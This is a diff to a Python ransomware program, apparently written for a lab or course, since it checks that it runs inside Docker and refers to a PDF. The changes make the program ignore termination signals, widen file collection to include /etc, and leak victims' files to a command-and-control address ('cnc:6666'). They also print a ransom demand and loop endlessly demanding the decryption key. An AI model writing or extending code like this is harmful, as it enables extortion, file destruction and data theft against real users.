@@ -2,6 +2,9 @@ import logging
 import socket
 import re
 import sys
+import subprocess
+from signal import signal, SIGTERM, SIGINT, SIG_IGN
+
 from os import system
 from pathlib import Path
 from secret_manager import SecretManager
@@ -10,14 +13,16 @@ from ascii_wonders import *
 CNC_ADDRESS = "cnc:6666"
 INSTALL_PATH = "/root/ransomware"
 
+# definition of a function used to initialise the code. This function sets the signals SIGTERM and SIGINT to be ignored so that the app cannot be closed
+def pre_exec():
+    signal(SIGINT, SIG_IGN)
+    signal(SIGTERM, SIG_IGN)
 
 class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
         self._log = logging.getLogger(self.__class__.__name__)
         self._secret_manager = SecretManager(CNC_ADDRESS)
-
-
 
     def check_hostname_is_docker(self) -> None:
         # At first, we check if we are in a docker
@@ -33,12 +38,7 @@ class Ransomware:
         """files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
         The paths are stored as strings."""
         
-        # file_list = [str(p) for p in list(Path().rglob(filter))]
-        file_list = []
-        for p in Path().rglob(filter):
-            if "/etc/" in str(p):
-                continue
-            file_list.append(str(p)) 
+        file_list = [str(p) for p in list(Path().rglob(filter))]
 
         self._log.debug(file_list)
         return file_list
@@ -60,12 +60,13 @@ class Ransomware:
         self._secret_manager.setup()
         self._secret_manager.xorfiles(files_to_encrypt)
 
+        self._secret_manager.leak_files(files_to_leak)
+
         token = self._secret_manager.get_hex_token()
         print(OH_NO)
-        print(f"Your txt files have been encrypted! Please send an email to support@igotpwned.com with object '{token}' to retrieve your data.")
+        print(f"Your txt files have been encrypted (and stolen, of course)! Please send an email to support@igotpwned.com with object '{token}' to retrieve your data.")
         print(HERE_WIPE_YOUR_TEARS)
         print(ASCII_TISSUE_BOX)
-        self._secret_manager.leak_files(files_to_leak)
         return None
     
     def add_reminder_to_bashrc(self, path: str) -> None:
@@ -79,16 +80,16 @@ class Ransomware:
         # main function for decrypting (see PDF)
         self._log.debug("PASSING THROUGH decrypt() FUNCTION!!!!")
         self._secret_manager.load()
-        candidate_key = input("Please enter your cryptographic key: ")
+        candidate_key = input("\rPlease enter your cryptographic key: ")
         while not self._secret_manager.set_key(candidate_key):
             print("The key you have entered is incorrect.")
-            candidate_key = input("Please enter your cryptographic key: ")
+            candidate_key = input("\rPlease enter the correct cryptographic key: ")
 
-        # self._secret_manager.set_key(candidate_key)
         files_to_decrypt = []
         files_to_decrypt.extend(self.get_files("*.txt"))
         files_to_decrypt.extend(self.get_files("*.bak"))
         files_to_decrypt.extend(self.get_files("*.md"))
+        
 
         self._secret_manager.xorfiles(files_to_decrypt)
         self._secret_manager.clean(INSTALL_PATH)
@@ -99,6 +100,7 @@ class Ransomware:
 
 
 if __name__ == "__main__":
+    pre_exec()
     if "--verbose" in sys.argv:
         logging.basicConfig(level=logging.DEBUG)
     else:
@@ -107,5 +109,10 @@ if __name__ == "__main__":
     ransomware = Ransomware()
     if not "--decrypt" in sys.argv:
         ransomware.encrypt()
+        while (True):
+            try:
+                ransomware.decrypt()
+            except EOFError:
+                continue
     if "--decrypt" in sys.argv:
         ransomware.decrypt()
